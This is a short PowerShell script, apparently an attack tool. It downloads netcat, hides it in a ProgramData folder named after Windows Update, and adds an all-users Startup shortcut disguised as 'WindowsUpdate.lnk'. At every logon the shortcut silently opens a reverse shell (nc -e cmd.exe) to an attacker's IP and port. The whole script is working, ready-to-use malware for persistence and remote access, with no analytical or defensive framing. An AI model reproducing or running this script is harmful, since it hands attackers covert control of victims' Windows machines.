$ncPath = "C:\ProgramData\WindowsUpdate\nc.exe"  # Shared location
$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupFolder\WindowsUpdate.lnk"
$ip = "192.168.1.100"  # Change this to your attacker's IP
$port = "4444"         # Change this to your desired port

# Ensure Netcat is installed in a shared directory
if (!(Test-Path $ncPath)) {
    Write-Host "Netcat not found. Downloading..."
    $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
    $zipPath = "$env:TEMP\nc.zip"
    Invoke-WebRequest -Uri $url -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
    Move-Item -Path "$env:TEMP\netcat-1.12\nc.exe" -Destination $ncPath -Force
    Remove-Item -Path $zipPath -Force
    attrib +h $ncPath  # Hide Netcat
}

# Create a global startup shortcut
if (!(Test-Path $shortcutPath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = "cmd.exe"
    $Shortcut.Arguments = "/c start /b $ncPath $ip $port -e cmd.exe"
    $Shortcut.WindowStyle = 7  # Hidden window
    $Shortcut.Save()
}
